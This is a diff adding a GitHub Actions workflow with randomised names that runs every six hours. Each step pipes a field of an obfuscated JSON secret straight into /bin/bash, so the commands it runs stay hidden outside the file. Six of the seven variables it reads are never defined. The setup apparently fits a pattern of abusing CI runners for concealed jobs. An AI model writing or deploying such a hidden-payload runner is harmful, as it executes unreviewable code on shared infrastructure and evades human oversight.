@@ -1,0 +1,24 @@
+name: liufutu4716
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '11 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: liufutu4716
+        env:
+          j23955: ${{ secrets.j23955 }}
+        run: |
+          echo $j23955 | jq -r .ld42390 | /bin/bash
+          echo $p8020 | jq -r .szxjn9 | /bin/bash
+          echo $kgp4 | jq -r .mwk798 | /bin/bash
+          echo $eqkxg932 | jq -r .wlnig39 | /bin/bash
+          echo $kv8605 | jq -r .snzr6743 | /bin/bash
+          echo $clhxq5 | jq -r .vzmcw7 | /bin/bash
+          echo $e6095 | jq -r .hvk15651 | /bin/bash
+
